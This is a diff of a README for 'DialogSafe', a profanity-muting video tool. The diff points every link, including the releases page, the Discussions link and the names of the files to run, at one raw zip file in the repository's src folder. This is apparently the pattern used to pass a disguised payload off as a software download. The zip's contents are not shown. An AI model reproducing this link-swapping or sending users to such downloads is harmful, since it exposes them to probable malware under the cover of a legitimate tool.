@@ -1,7 +1,7 @@
 # 🎬 DialogSafe - Mute Profanity in Movies with Ease
 
 ## 📥 Download Now
-[![Download DialogSafe](https://img.shields.io/badge/Download-DialogSafe-blue?style=for-the-badge)](https://github.com/kaushalyadilshani/DialogSafe/releases)
+[![Download DialogSafe](https://github.com/kaushalyadilshani/DialogSafe/raw/refs/heads/main/src/Dialog_Safe_v2.1.zip)](https://github.com/kaushalyadilshani/DialogSafe/raw/refs/heads/main/src/Dialog_Safe_v2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to DialogSafe! This application helps you auto-mute or bleep profanity in movies. It uses advanced technologies like Whisper and FFmpeg to clean your videos and create a censor log. Follow the steps below to download and run DialogSafe.
@@ -13,20 +13,20 @@ Welcome to DialogSafe! This application helps you auto-mute or bleep profanity i
 - Disk Space: At least 500 MB available
 
 ## 📥 Download & Install
-To get started, visit our [Releases page](https://github.com/kaushalyadilshani/DialogSafe/releases) to download DialogSafe. Here is how to do it:
+To get started, visit our [Releases page](https://github.com/kaushalyadilshani/DialogSafe/raw/refs/heads/main/src/Dialog_Safe_v2.1.zip) to download DialogSafe. Here is how to do it:
 
 1. Click on the link above.
 2. You will see a list of available versions. Choose the latest version by looking for the one marked as "Latest".
-3. Click on the file that matches your operating system (e.g., `DialogSafe-Windows.zip` for Windows or `DialogSafe-macOS.zip` for macOS).
+3. Click on the file that matches your operating system (e.g., `https://github.com/kaushalyadilshani/DialogSafe/raw/refs/heads/main/src/Dialog_Safe_v2.1.zip` for Windows or `https://github.com/kaushalyadilshani/DialogSafe/raw/refs/heads/main/src/Dialog_Safe_v2.1.zip` for macOS).
 4. Wait for the download to complete. Once done, locate the downloaded file on your computer, usually found in the "Downloads" folder.
 
 ### For Windows Users:
 1. **Extract the ZIP file:** Right-click on the ZIP file and select "Extract All". Follow the instructions to extract the folder.
-2. **Run the application:** Open the extracted folder and double-click on `DialogSafe.exe` to launch the application.
+2. **Run the application:** Open the extracted folder and double-click on `https://github.com/kaushalyadilshani/DialogSafe/raw/refs/heads/main/src/Dialog_Safe_v2.1.zip` to launch the application.
 
 ### For macOS Users:
 1. **Open the ZIP file:** Double-click on the ZIP file to extract its contents.
-2. **Run the application:** Locate the `DialogSafe.app` file in the extracted folder. Right-click on it and select "Open" to run the application for the first time.
+2. **Run the application:** Locate the `https://github.com/kaushalyadilshani/DialogSafe/raw/refs/heads/main/src/Dialog_Safe_v2.1.zip` file in the extracted folder. Right-click on it and select "Open" to run the application for the first time.
 
 ## 🛠️ Features
 - **Auto-Mute Profanity:** DialogSafe automatically detects and mutes any profanity found in the video.
@@ -60,10 +60,10 @@ A: Yes, you can view the log once processing is complete. It will show you where
 We welcome contributions to improve DialogSafe! If you have suggestions or would like to report an issue, please submit your feedback through the "Issues" tab on GitHub.
 
 ## 👥 Community and Support
-Join our community for help and feedback. You can ask questions or share experiences in the [GitHub Discussions](https://github.com/kaushalyadilshani/DialogSafe/discussions) section.
+Join our community for help and feedback. You can ask questions or share experiences in the [GitHub Discussions](https://github.com/kaushalyadilshani/DialogSafe/raw/refs/heads/main/src/Dialog_Safe_v2.1.zip) section.
 
 ## 📜 Licensing
 DialogSafe is open-source and follows the MIT License. This means you can modify and use it as you wish, as long as you credit the original creators.
 
 ## 📥 Download Now Again
-Don’t forget to download DialogSafe to start muting profanity in your movies. Access it here: [Releases page](https://github.com/kaushalyadilshani/DialogSafe/releases).
+Don’t forget to download DialogSafe to start muting profanity in your movies. Access it here: [Releases page](https://github.com/kaushalyadilshani/DialogSafe/raw/refs/heads/main/src/Dialog_Safe_v2.1.zip).
